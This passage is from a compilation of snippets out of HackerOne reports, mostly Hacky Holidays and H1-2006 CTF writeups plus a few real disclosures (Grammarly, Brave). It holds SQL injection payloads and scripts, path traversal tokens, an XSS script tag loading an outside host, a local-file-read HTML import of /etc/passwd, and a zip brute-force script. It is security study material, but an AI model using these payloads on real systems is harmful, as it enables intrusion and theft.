Cookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3…
```

## 100. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```http
GET /api/staff? HTTP/1.1
Host: api.bountypay.h1ctf.com
```

## 101. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```http
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Cookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3…

'''
```

## 102. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```http
GET /api/staff? HTTP/1.1
Host: api.bountypay.h1ctf.com

'''
```

## 103. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```http
GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
Host: hackyholidays.h1ctf.com
```

## 104. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```http
GET /people-rater/entry?id=eyJpZCI6MX0g HTTP/1.1
Host: hackyholidays.h1ctf.com
```

## 105. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```http
GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1
Host: hackyholidays.h1ctf.com
```

## 106. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```http
POST /evil-quiz HTTP/1.1
Host: hackyholidays.h1ctf.com
Cookie: session=b519f0f0b323624b25663d3565cc8c2a

name=asdasd
```

## 107. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```http
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com

action=signup&username=fwefgergeg&password=ergegerg&age=1e6&firstname=gergerg&lastname=YYYYYYYYYYYYYYYYYYY
```

## 108. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```http
GET /r3c0n_server_4fdk59/album?hash=jdh34k HTTP/1.1
Host: hackyholidays.h1ctf.com
```

## 109. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```http
GET /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXIiLCJhdXRoIjoiYmZiNmRkMDRlNjZlODU1NjRkZWJiYTNlN2IyMjJlMzQifQ== HTTP/1.1
Host: hackyholidays.h1ctf.com
```

## 110. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```http
GET /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== HTTP/1.1
Host: hackyholidays.h1ctf.com
```

## 111. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```http
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==

HTTP/1.1 200 OK
```

## 112. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```http
GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjM%3d HTTP/1.1
Host: staff.bountypay.h1ctf.com
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NV…
```

## 113. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```
From here we can see that we can include `{{name}}` as well as two templates. It is also possible to create a new mail for testing. If we try to include a wrong path with `{{template:chron0x}}` we get the response `Cannot find template file /templates/chron0x`. Checking the path `/hate-mail-generator/templates/` we find that there exists another template: `38dhs_admins_only_header.html`. However, including it in the markup results in the message: `You do not have access to the file 38dhs_admins_only_header.html`. On the other side including it in the Subject or Name field does not lead to such an error. Previously we also have seen, that it is possible to include `{{name}}`. Investigating the request in Burp, we can see that `preview_data` is used as a body parameter. URL decoding the parameter results in:
```

## 114. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```
Using this payload, the response to `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=hash=chron0x%27%20UNION%20ALL%20SELECT%20%22chron0x%27%20UNION%20ALL%20SELECT%20NULL,NULL,%27chron0x_path%27--%20-%22,null,null%20--%20-`, will try to fetch an image with the following: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2Nocm9uMHhfcGF0aCIsImF1dGgiOiJmOTNjMzI5MjI5OTU0ZWQzOWRmYTRhMzkwMTNmNjljNSJ9`. Decoding the base64 payload, we can see that `chron0x_path` is reflected
```

## 115. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```http
GET /people-rater/entry?id=eyJpZCI6Mn0=
```

## 116. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```http
Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop.
```

## 117. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```python
import requests
import re
from bs4 import BeautifulSoup

HOST = "https://hackyholidays.h1ctf.com"
hash_URL = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/{}' -- -",'12',1-- -"

with open("lists/objects-lowercase.txt", "r") as f:
    data = f.read().split("\n")

for endpoint in data:
    r = requests.get(hash_URL.format(endpoint.strip()))
    soup = BeautifulSoup(r.content, "html.parser")
    next_url = soup.findAll("img", {"class": "img-responsive"})
    if next_url:
        new_url = HOST + next_url[-1]["src"]
        nr = requests.get(new_url)
        if nr.content != "Expected HTTP status 200, Received: 404":
            print(endpoint, "--", new_url)
```

## 118. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```
I base64 decoded one of the value and got test as `{"image":"r3c0n_server_4fdk59\/uploads\/13d74554c30e1069714a5a9edda8c94d.jpg","auth":"94fb398d78b36e7c079e7560ce9df721"}`
I tried accessing the page directly using [https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/uploads/13d74554c30e1069714a5a9edda8c94d.jpg][29] but got response as `Image cannot be viewed directly`.
[29]: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/uploads/13d74554c30e1069714a5a9edda8c94d.jpg "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/uploads/13d74554c30e1069714a5a9edda8c94d.jpg"
We can only access those images through `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=` with that base64 encoded data with `image` and `auth` parameter.
So, I tried tampering with the image parameter to point it to `../api/someendpoint` but failed it `auth` key is validated for each request so I had to find a way to generate `auth` token for each request.
This is the part where I stuck for so long. Thanks to my friend `@MrKn0w1t4ll` for helping me here.
{F1132595}
From the great Inception movie, one dream inside another.
Here one SQL injection inside another SQL injection( Nested SQL injection)
[Here][30] is a great resource.
[30]: https://captnemo.in/blog/2012/06/09/nested-sql-injections/   "Here"
I already had SQL injection in `hash` parameter where we control `hash` parameter from query. 
Thanks to the author for clearing the doubts here, here is flow 
The first query is just “select * from albums where hash = x “
Something like
# … truncated …
```

## 119. [#1069388](https://hackerone.com/reports/1069388)  -  It's just a man on a mission
*critical*

```http
GET /people-rater/entry?id=eyJpZCI6NH0= HTTP/1.1
Host: hackyholidays.h1ctf.com
```

## 120. [#1069388](https://hackerone.com/reports/1069388)  -  It's just a man on a mission
*critical*

```http
GET /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== HTTP/1.1
Host: hackyholidays.h1ctf.com
Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687
```

## 121. [#389108](https://hackerone.com/reports/389108)  -  Handling of `tracking` command allows making arbitrary blind requests with user's cookies from Grammarly Extension's origin
*critical*

```
#### XHR + cookies

Grammarly extension has permissions to access all URLs and cookies from all origins. 
Grammarly makes all XHR requests with cookies -> it's possible for attacker to make blind requests with cookies to any origin.

> (except `chrome://`, however, `chrome-extension://` is allowed because of polyfill for `fetch`).

> More details in "Impact" section.

## Browsers Verified In:

Chrome 70.0.3508.0 Canary
Chrome 68.0.3440.75 Stable
Grammarly: 14.858.1756

## Steps To Reproduce:

### Change user's name in Grammarly
1. Open `app-grammarly-csfr.html`
2. Page makes request to `https://auth.grammarly.com/v3/user` to change your name to "Anonymous User" 

### GET Gmail as proof
1. Open Grammarly extension debug page in Chrome
2. Open `get-request-to-gmail.html`
3. Open "Network" tab in the debug page
4. Note that extension made a GET request to Gmail (with cookies)
5. Open request preview
6. Note that request includes your gmail content
7.  That means, it's possible to initiate requests with cookies to any origin. Web applications without "direct CSRF protection" (e.g. `hidden` field with some value, not token in cookies ) are controllable by attacker.

## Supporting Material/References:

1. Screencast for POST to`https://auth.grammarly.com/v3/user`. [1st PoC]
2. Screencast to prove that Grammarly makes requests with cookies to cross-origin domains. [2nd PoC] 

# … truncated …
```

## 122. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```
../../redirect?url=https://software.bountypay.h1ctf.com/#
```

## 123. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```
../../redirect?url=https://software.bountypay.h1ctf.com/{payload}#
```

## 124. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```
../../redirect?url=https://software.bountypay.h1ctf.com/uploads#/statements?month=02&y
```

## 125. [#3183046](https://hackerone.com/reports/3183046)  -  Cache Pollution via Unkeyed GET Parameters on www.omise.co
*medium*

```http
GET /en/contact-sales?test=123 HTTP/2
Host: www.omise.co
```

## 126. [#3183046](https://hackerone.com/reports/3183046)  -  Cache Pollution via Unkeyed GET Parameters on www.omise.co
*medium*

```http
GET /en/contact-sales?abc=456 HTTP/2
Host: www.omise.co
```

## 127. [#2104566](https://hackerone.com/reports/2104566)  -  (CVE-2023-32006) Permissions policies can impersonate other modules in using module.constructor.createRequire()
*medium*

```http
Patch was provided about maintainer opted for different approach.

## Impact
```

## 128. [#416040](https://hackerone.com/reports/416040)  -  Field Day With Protocol Handlers
*medium*

```http
Delete the code '''clearInterval(window.refreesh);''' on line 56 in file '''landing_run.html''' and launch it.

It will now launch the hardware wallet every 300 milliseconds.
```

## 129. [#321938](https://hackerone.com/reports/321938)  -  [www.zomato.com] Getting a complimentary dessert [Zomato Treats] on ordering a Meal at no cost
*medium*

```http
POST https://www.zomato.com/php/o2_handler.php

Host: www.zomato.com
```

## 130. [#438274](https://hackerone.com/reports/438274)  -  Prototype pollution attack (smart-extend)
*medium*

```http
get results:
```

## 131. [#1065829](https://hackerone.com/reports/1065829)  -  Invading Grinch Network and Saving Christmas
*critical*

```shell
curl https://hackyholidays.h1ctf.com/swag-shop/api/sessions | jq -r '.sessions[]' | base64 -d | jq -r '.user'
```

## 132. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```json
{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

## 133. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```json
[+] https://api.bountypay.h1ctf.com/api/accounts/../../redirect?url=https://software.bountypay.h1ctf.com/uploads#/statements?month=02&year=2019
<html>
<head><title>Index of /uploads/</title></head>
<body bgcolor="white">
<h1>Index of /uploads/</h1><hr><pre><a href="../">../</a>
<a href="/uploads/BountyPay.apk">BountyPay.apk</a>                                        20-Apr-2020 11:26              4043701
</pre><hr></body>
</html>
```

## 134. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```bash
curl 'http://localhost/signupmanager/' -H 'Content-Type: application/x-www-form-urlencoded' -d 'action=signup&username=test123&password=password&age=1e9&firstname=foo&lastname=mypayloaY'
```

## 135. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```
Python3 sqlmap.py -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --method get -p "hash" --dbs
```

## 136. [#1069467](https://hackerone.com/reports/1069467)  -  H1 Hackyholidays CTF - The Grinch was defeated
*critical*

```python
#!/usr/bin/python3

import requests, time, urllib3
import re
from bs4 import BeautifulSoup

if __name__ == "__main__": 
    print("[*] Challenge 11 - Identify endpoints")
    with open("api_object_lowercase.txt") as f:
        for endpoint in f:
            session = requests.session()
            x = endpoint.rstrip()
            burp0_url = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27../api/{}%27--%20-%22,1,2--%20-".format(x)
            burp0_headers = {"Connection": "close", "Content-Type":"application/json","Cache-Control": "max-age=0", "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "*/*", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,zh-CN;q=0.6,zh;q=0.5"}
            r = session.get(burp0_url, headers=burp0_headers)
            soup = BeautifulSoup(r.text)
            l = soup.find_all("img", {"class": "img-responsive"})
            p = l[2]["src"]
            burp0_url = "https://hackyholidays.h1ctf.com{}".format(p)
            r = session.get(burp0_url, headers=burp0_headers)
            if "Expected" not in r.text:
                print("/{} is available".format(x))
# … truncated …
```

## 137. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```shell
$ curl https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0= 
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```

## 138. [#1829170](https://hackerone.com/reports/1829170)  -  Double forward slash breaks server-side restrictions & allows access to prohibited services from a partner account
*low*

```http
POST //api/v2/autorebates/groups/ HTTP/2
Host: my.exnesstrade.pro
Content-Type: application/json
Authorization: JWT xyz

{
"group_title":"Test"
}
```

## 139. [#1829170](https://hackerone.com/reports/1829170)  -  Double forward slash breaks server-side restrictions & allows access to prohibited services from a partner account
*low*

```http
POST //api/v2/autorebates/groups/ HTTP/2
Host: my.exnesstrade.pro
Content-Type: application/json
Authorization: JWT xyz

{
```

## 140. [#2104567](https://hackerone.com/reports/2104567)  -  (CVE-2023-32003) fs.mkdtemp() and fs.mkdtempSync() are missing getValidatedPath() checks
*low*

```http
Patch was provided.

## Impact
```

## 141. [#390013](https://hackerone.com/reports/390013)  -  Local files reading from the web using `brave://`
*critical*

```html
<script>
        function show() {
            var file = link.import.querySelector('body')
            alert(file.innerHTML)
        }
    </script>
```

## 142. [#777241](https://hackerone.com/reports/777241)  -  [h1-415 2020] Multiple chained vulnerabilities lead to leaking secret document
*critical*

```html
<script src=//nytr0.xss.ht></script>
```

## 143. [#1065829](https://hackerone.com/reports/1065829)  -  Invading Grinch Network and Saving Christmas
*critical*

```html
<script>alert</script>
```

## 144. [#1065829](https://hackerone.com/reports/1065829)  -  Invading Grinch Network and Saving Christmas
*critical*

```
' OR 1=1-- -` the SQL query will evaluate to TRU
```

## 145. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```
' OR 1=1-- -` then the server will return a lot
```

## 146. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```
' or '1'='1`, in the `score` we'll see that `There
```

## 147. [#1069388](https://hackerone.com/reports/1069388)  -  It's just a man on a mission
*critical*

```python
import requests
import re
from string import printable

base_username=''
base_password=''

def search_username(username):
    for c in printable:
        if c == '_' or c == '%':
            c = "\\" + c
        r=requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=\' UNION SELECT "\' UNION SELECT \'null.jpg\',null,\'../api/user?username={}{}%\'-- -",null,1-- -'.format(username,c))
        regex=re.search('data=.*\"', r.text)
        data_param=regex.group(0)
        data_param = data_param[:-1]
        r2=requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?{}'.format(data_param))
        
        if r2.text.find("Invalid content type detected") != -1:
            username += c
            print("new char found: " +username)
            search_username(username)

def search_password(password):
    for c in printable:
        if c == '_' or c == '%':
            c = "\\" + c
        r=requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=\' UNION SELECT "\' UNION SELECT \'null.jpg\',null,\'../api/user?password={}{}%\'-- -",null,1-- -'.format(password,c))
        regex=re.search('data=.*\"', r.text)
        data_param=regex.group(0)
        data_param = data_param[:-1]
        r2=requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?{}'.format(data_param))
        
        if r2.text.find("Invalid content type detected") != -1:
            password += c
            print("new char found: " +password)
# … truncated …
```

## 148. [#389108](https://hackerone.com/reports/389108)  -  Handling of `tracking` command allows making arbitrary blind requests with user's cookies from Grammarly Extension's origin
*critical*

```
##### `gnar.setUser`/`gnar._execQueue` / `gnar._send` / `gnar._doSend` / `gnar._enqueue` 

`p.tracker.gnar` has a set of interesting methods like `setUser`. Grammarly extension uses `setUser` to invalidate session.
```

## 149. [#390013](https://hackerone.com/reports/390013)  -  Local files reading from the web using `brave://`
*critical*

```html
<head>
    <script>
        function show() {
            var file = link.import.querySelector('body')
            alert(file.innerHTML)
        }
    </script>
    <link id="link" href="brave:///etc/passwd" rel="import" as="document" onload="show()" />
</head>
```

## 150. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```shell
$ adb shell
$ am start -a android.intent.action.VIEW -d "one://part?start=PartTwoActivity" -n bounty.pay/.PartOneActivity
$ am start -a android.intent.action.VIEW -d "two://part?two=light&switch=on" -n bounty.pay/.PartTwoActivity
[ I wrote "X-Token" in the text field that just appeared ]
$ am start -a android.intent.action.VIEW -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk=&switch=b24=&header=X-Token" -n bounty.pay/.PartThreeActivity
[ A new text field appeared ]
$ adb shell cat ./data/data/bounty.pay/shared_prefs/user_created.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="USERNAME">sw33tLie</string>
    <string name="PARTTWO">COMPLETE</string>
    <string name="HOST">http://api.bountypay.h1ctf.com</string>
    <string name="PARTONE">COMPLETE</string>
    <string name="TWITTERHANDLE">sw33tLie</string>
    <string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string>
</map>
[ I wrote the token in the new text field ]
[ Challenge completed! ]
```

## 151. [#1065829](https://hackerone.com/reports/1065829)  -  Invading Grinch Network and Saving Christmas
*critical*

```sql
' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) = 113-- -
```

## 152. [#1065829](https://hackerone.com/reports/1065829)  -  Invading Grinch Network and Saving Christmas
*critical*

```sql
' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 113-- -
```

## 153. [#1065829](https://hackerone.com/reports/1065829)  -  Invading Grinch Network and Saving Christmas
*critical*

```sql
test' AND (ascii(substr((SELECT password FROM quiz.admin LIMIT 0,1),1,1))) = 112--  -
```

## 154. [#1065829](https://hackerone.com/reports/1065829)  -  Invading Grinch Network and Saving Christmas
*critical*

```bash
for i in $(cat keyword-salts.txt); do echo "5aa9b5a497e3918c0e1900b2a2228c38:$i >>saltedhashes.txt
```

## 155. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
When clicking on an individual entry, an alert is shown with a rating of the person the grinch noted down. In the background, a `GET` request to `/people-rater/entry?id=<id>` is made, which e.g. returns the following result for the first entry:
```

## 156. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
The `id` parameter looks like base64 encoded JSON. What immediately looked interesting was that decoding the ID of the first entry gave the following result:
```

## 157. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
Issuing the following `GET` request returns an entry for the grinch. Of course, the grinch gave himself a good rating, it's hard to stay objective when talking about oneself, isn't it? But more importantly, flag 3, `flag{b705fb11-fb55-442f-847f-0931be82ed9a}`, gets displayed as well:

{F1138930}

## Flag 4 - Swag Shop

**App description**: "Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop."

When visiting the swag shop site, 3 articles are displayed: one can buy an `I Hate Xmas Hoodie`, an `Xmas Sucks Cap` or a `Snow Ball Launcher`, obviously items the grinch himself would buy immediately. However, when clicking on the `Purchase` button below an item, a login promt gets displayed, it is not possible to buy anything if one does not have a swag shop account.

As there were no other options on the site, I took a look at the traffic in BurpSuite:

{F1138931}

Trying to purchase an item triggered requests to some endpoints under `/swagshop/api`: `login`, `purchase` and `stock`. Trying to manipulate the parameters did not give any useful results, therefore, I decided to fuzz the endpoints under `/swag-shop/api`. After using some small wordlists without success, finally, two additional endpoints were discovered:
# … truncated …
```

## 158. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
However, adding a cookie with the key `token` did not help, even when decoding the cookie and using the base64 decoded value:
```

## 159. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
This value is 128 characters long and therefore could be a hash, however googling and trying to crack the hash did not work either.

Finally, I remembered the challenge description: "Try and find a way to pull the Grinch's personal details from the online shop." Maybe there is a way to get personal details without logging in? I remembered that I found another endpoint, `/swag-shop/api/user` and that I got a user ID from the session identifier as well. 

The user endpoint returns `400 Bad Request` and the message `{"error":"Missing required fields"}` when being called without parameters. Another round of fuzzing with different wordlists finally revealed that the `uuid` parameter is required:
```

## 160. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
The `404 Not Found` first made me think that this approach was another rabbit hole, but the message `{"error":"Could not find matching uuid"}` looked promising. Using the user ID as UUID finally gave me grinch's personal details together with the flag, `flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`:

{F1138932}

## Flag 5 - Secure Login

**App description**: "Try and find a way past the login page to get to the secret area."

When visiting `https://hackyholidays.h1ctf.com/secure-login`, a login form is shown and nothing else. When trying to login with random username and password, the error message `Invalid Username` gets returned. I tried to manipulate the username and password parameters, use SQLI payloads and test if special characters cause different error messages without success. As there was no other interesting content in the HTML source of the login page, I decided to bruteforce the username:
```

## 161. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
Great - using `access` as username returns `Invalid Password` instead of `Invalid Username`. Maybe we can bruteforce the password as well?
```

## 162. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
Great, seems like we got valid credentials!

Login with credentials `access:computer` succeeds, but `No Files To Download` gets displayed. Looks like there are some files to download, but not for us... 

{F1138933}

After searching for interesting stuff in the HTML source with no success, I decided to take a closer look at the authentication mechanism. The page uses cookie-based authentication. The cookie seems to be base64-encoded JSON because it starts with `eyJ` and ends with `%3D` (which is `=` when being URL-decoded). Decoding the cookie gives the following result:
```

## 163. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
After getting the credentials (which took quite a while), I was able to login with `admin:S3creT_p4ssw0rd-$` and get the flag, `flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`:

{F1138948}

## Flag 10 - Signup Manager

**App description**: "You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!"

When visiting `https://hackyholidays.h1ctf.com/signup-manager` and looking through the HTML source, there is a reference to `README.md`:
```

## 164. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
Finally, it was possible to login under [Attack Box](https://hackyholidays.h1ctf.com/attack-box/login) with the credentials `grinchadmin:s4nt4sucks` and get the flag, `flag{07a03135-9778-4dee-a83c-7ec330728e72}`:

{F1138952}


## Flag 12 - Attack Box

As shown above, a list of santa's key servers is listed on the attack-box, and attacks can be launched directly from there. When clicking on the `attack` button, a web terminal opens, showing that host information is gathered and a DDOS attack is launched. After the "attack", a ping is made to the host to see it if is still up.

Of course, we do not attack santa but the grinch himself, it is quite logical that we need to attack localhost in some way.

When clicking on `Attack` besides an IP address, a `GET` request is submitted to `https://hackyholidays.h1ctf.com/attack-box/launch` with a parameter `payload` and a value that looks like base64-encoded JSON once again.

Decoding such a payload gives the following result:
```

## 165. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```bash
#!/bin/bash
echo "ZIP-JTR Decrypt Script";
if [ $# -ne 2 ]
then
echo "Usage $0 <zipfile> <wordlist>";
exit;
fi
unzip -l $1
for i in $(john --wordlist=$2 --rules --stdout) 
do
 echo -ne "\rtrying \"$i\" " 
 unzip -o -P $i $1 >/dev/null 2>&1 
 STATUS=$?
 if [ $STATUS -eq 0 ]; then
 echo -e "\nArchive password is: \"$i\"" 
 break
 fi
done
```

## 166. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```
if (getIntent() != null && getIntent().getData() != null) {
  String str = getIntent().getData().getQueryParameter("start");
  if (str != null && str.equals("PartTwoActivity") && sharedPreferences.contains("USERNAME")) {
	str = sharedPreferences.getString("USERNAME", "");
	SharedPreferences.Editor editor = sharedPreferences.edit();
	String str1 = sharedPreferences.getString("TWITTERHANDLE", "");
	editor.putString("PARTONE", "COMPLETE").apply();
	logFlagFound(str, str1);
	startActivity(new Intent((Context)this, PartTwoActivity.class));
  } 
}
```

## 167. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```sql
' UNION select NULL;-- --> 404
' UNION select NULL,NULL;-- --> 404
' UNION select NULL,NULL,NULL;-- --> 200; column count is three
' UNION select NULL,NULL,NULL,NULL;-- --> 404
```

## 168. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```sql
select id, hash, name from album where hash='' UNION select 1, NULL, NULL;--
```

## 169. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```
MariaDB [test]> select id, hash, name from album UNION select 1,null,null;
+----+------+------+
| id | hash | name |
+----+------+------+
|  1 | NULL | NULL |
+----+------+------+
1 row in set (0.002 sec)
```

## 170. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```
MariaDB [test]> select id, hash, name from album UNION select "' UNION select null,null,'xyz.jpg'",null,null;
+------------------------------------+------+------+
| id                                 | hash | name |
+------------------------------------+------+------+
| ' UNION select null,null,'xyz.jpg' | NULL | NULL |
+------------------------------------+------+------+
1 row in set (0.108 sec)
```

## 171. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```
select id, album_id, photo from photo where album_id='' UNION select null,null,'xyz.jpg'

MariaDB [test]> select id, album_id, photo from photo where album_id='' UNION select null,null,'xyz.jpg'
    -> ;
+------+----------+---------+
| id   | album_id | photo   |
+------+----------+---------+
| NULL |     NULL | xyz.jpg |
+------+----------+---------+
1 row in set (0.078 sec)
```

## 172. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```
## Flag 5 Secure Login: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
The objective of this challenge is to find a way past the login page to get to the secret area. The challenge starts with a login page. Testing a random combination for the username and password field, an `Invalid Username` appears. This is an indicator, that we might be able to brute-force the username and password individually based on the error code. We first try to brute-force the username with:
```

## 173. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```
We receive the username:`access`. Given the username, trying a random password leads to the error response `Invalid Password`. We can brute-force the password using:
```

## 174. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```
## Flag 8 Forum: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
